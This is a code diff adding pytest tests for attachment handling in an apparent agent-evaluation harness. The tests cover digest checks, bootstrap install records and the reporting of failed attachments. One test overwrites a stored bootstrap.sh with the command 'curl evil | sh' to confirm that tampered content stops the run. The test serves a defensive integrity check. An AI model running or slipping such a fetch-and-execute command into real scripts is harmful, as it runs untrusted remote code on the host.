@@ -378,3 +378,90 @@ def test_oracle_keeps_the_author_network_and_gets_no_secrets(runner_python, mate
     spec = make_spec(materials, tmp_path, "ok", trials=1)
     assert executor._network(spec) is None and executor._agent(spec) == {"name": "oracle"}
     assert executor._task_env(spec) == {}
+
+
+def attachment_spec(materials, tmp_path, store) -> RunSpec:
+    from test_attachments import package
+
+    staged = store.unpack(package(), max_files=20, max_bytes=100_000)
+    digest = staged.content_digest
+    store.publish(staged)
+    spec = make_spec(materials, tmp_path, "attachments")
+    return replace(
+        spec,
+        effective_config={
+            **agent_spec(materials, tmp_path).effective_config,
+            "attachments": [
+                {
+                    "version_id": "att_1",
+                    "name": "tools",
+                    "version": "1.0.0",
+                    "content_digest": digest,
+                    "effects": ["agent_tools"],
+                    "provides": {"tools": [], "env": []},
+                    "has_bootstrap": True,
+                }
+            ],
+            "bootstrap_timeout_sec": 90,
+            "parameters": {},
+        },
+        secrets={"model_api_key": KEY},
+    )
+
+
+def test_attachments_reach_the_runner_and_install_records_are_kept(
+    runner_python, materials, tmp_path
+):
+    from maestro.execution.attachments import AttachmentStore
+
+    store = AttachmentStore(tmp_path / "data")
+    spec = attachment_spec(materials, tmp_path, store)
+    sink = RecordingSink()
+    executor = make_executor(runner_python, materials, tmp_path, attachments=store)
+    assert execute(executor, spec, sink).failure_code is None
+    request = json.loads((tmp_path / "work" / "request.json").read_text())
+    digest = spec.effective_config["attachments"][0]["content_digest"]
+    assert request["attachments"] == [
+        {
+            "name": "tools",
+            "version": "1.0.0",
+            "content_digest": digest,
+            "path": str(store.path_for(digest)),
+            "bootstrap": True,
+        }
+    ]
+    assert request["bootstrap_timeout_sec"] == 90
+    assert ("step", "trl_1", 1, "installing") in sink.events
+    kind, data = sink.files[("trl_2", 1, "maestro/attachments.json")]
+    assert kind == "trial" and json.loads(data)[0]["status"] == "failed"
+    ok, failed = finished(sink)["trl_1"][3], finished(sink)["trl_2"][3]
+    assert ok.reward_valid and ok.raw_score == 1.0
+    # Not a model result and not a zero: no grade, no retry, the failing package named.
+    assert failed.failure_cause == "attachment_failed" and failed.raw_score is None
+    assert not failed.grade_requested and not failed.retry_recommended
+    assert failed.detail == {
+        "attachment": "tools",
+        "version": "1.0.0",
+        "status": "failed",
+        "exit_code": 3,
+    }
+
+
+def test_a_purged_or_changed_attachment_fails_the_run_without_starting_it(
+    runner_python, materials, tmp_path
+):
+    from maestro.execution.attachments import AttachmentStore
+
+    store = AttachmentStore(tmp_path / "data")
+    spec = attachment_spec(materials, tmp_path, store)
+    digest = spec.effective_config["attachments"][0]["content_digest"]
+    (store.path_for(digest) / "bootstrap.sh").write_text("curl evil | sh\n")
+    sink = RecordingSink()
+    report = execute(
+        make_executor(runner_python, materials, tmp_path, attachments=store), spec, sink
+    )
+    assert report.cleanup_complete and not (tmp_path / "work" / "request.json").exists()
+    outcomes = {trial: event[3] for trial, event in finished(sink).items()}
+    assert set(outcomes) == {"trl_1", "trl_2"}
+    assert {o.exception_type for o in outcomes.values()} == {"AttachmentContentMissing"}
+    assert all(not o.grade_requested for o in outcomes.values())
